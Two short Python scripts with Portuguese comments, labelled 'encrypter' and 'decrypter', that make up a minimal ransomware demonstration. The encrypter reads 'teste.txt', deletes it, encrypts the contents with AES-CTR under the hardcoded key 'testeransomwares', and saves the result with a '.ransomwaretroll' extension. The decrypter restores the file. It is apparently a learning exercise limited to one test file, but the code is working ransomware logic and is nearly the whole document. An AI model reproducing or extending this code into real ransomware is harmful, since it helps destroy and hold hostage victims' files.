encrypter<br>
<br>
import os <br>
import pyaes <br>
<br>
## abrir o arquivo a ser criptografado<br>
file_name = "teste.txt"<br>
file = open(file_name, "rb")<br>
file_data = file.read()<br>
file.close()<br>
<br>
## remover o arquivo<br>
os.remove(file_name)<br>
<br>
## chave de criptografia<br>
key = b"testeransomwares"<br>
aes = pyaes.AESModeOfOperationCTR(key)<br>
<br>
## criptografar o arquivo<br>
crypto_data = aes.encrypt(file_data)<br>
<br>
## salvar o arquivo criptografado<br>
new_file = file_name + ".ransomwaretroll"<br>
new_file = open(f'{new_file}','wb')<br>
new_file.write(crypto_data)<br>
new_file.close()<br>
<br>

decrypter<br>
<br>
import os<br>
import pyaes<br>
<br>
## abrir o arquivo criptografado<br>
file_name = "teste.txt.ransomwaretroll"<br>
file = open(file_name, "rb")<br>
file_data = file.read()<br>
file.close()<br>
<br>
## chave para descriptografia<br>
key = b"testeransomwares"<br>
aes = pyaes.AESModeOfOperationCTR(key)<br>
decrypt_data = aes.decrypt(file_data)<br>
<br>
## remover o arquivo criptografado<br>
os.remove(file_name)<br>
<br>
## criar o arquivo descriptografado<br>
new_file = "teste.txt"<br>
new_file = open(f'{new_file}', "wb")<br>
new_file.write(decrypt_data)<br>
new_file.close()<br>
